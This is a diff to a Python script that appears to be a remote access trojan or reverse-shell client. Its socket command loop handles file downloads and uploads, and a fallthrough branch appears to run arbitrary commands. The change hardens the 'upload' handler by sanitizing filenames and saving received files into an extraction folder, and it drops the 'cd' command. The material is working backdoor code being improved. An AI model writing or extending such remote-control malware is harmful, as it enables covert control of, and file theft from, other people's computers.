@@ -608,23 +608,28 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                         send_data("[!] File not found.")
 
                 elif cmd.startswith("upload "):
-                    filename = cmd.split(" ", 1)[1]
-                    with open(filename, "wb") as f:
-                        s.send(b"[+] Ready to receive.\n")
-                        while True:
-                            chunk = s.recv(1024)
-                            if b"ENDFILE" in chunk:
-                                f.write(chunk.replace(b"ENDFILE", b""))
-                                break
-                            f.write(chunk)
-                    send_data(f"[+] Upload complete: {filename}")
+                    raw_name = cmd.split(" ", 1)[1].strip().strip('"')
 
-                elif cmd.startswith("cd "):
+                    # Sanitize filename for Windows (no quotes, special chars, etc.)
+                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', raw_name)
+                    safe_name = safe_name.replace(" ", "_")  # optional: convert spaces to underscore
+
+                    # Ensure save path inside EXTRACT_FOLDER
+                    save_path = os.path.join(EXTRACT_FOLDER, safe_name)
+
                     try:
-                        os.chdir(cmd[3:].strip())
-                        send_data(f"[+] Changed directory to {os.getcwd()}")
+                        with open(save_path, "wb") as f:
+                            s.send(b"[+] Ready to receive.\n")
+                            while True:
+                                chunk = s.recv(1024)
+                                if b"ENDFILE" in chunk:
+                                    f.write(chunk.replace(b"ENDFILE", b""))
+                                    break
+                                f.write(chunk)
+                        send_data(f"[+] Upload complete: {safe_name}")
                     except Exception as e:
-                        send_data(f"[!] Failed to change directory: {e}")
+                        send_data(f"[!] Upload failed: {e}")
+
 
                 else:
                     try:
@@ -701,4 +706,5 @@ def run():
 
 if __name__ == "__main__":
     run()
+
 
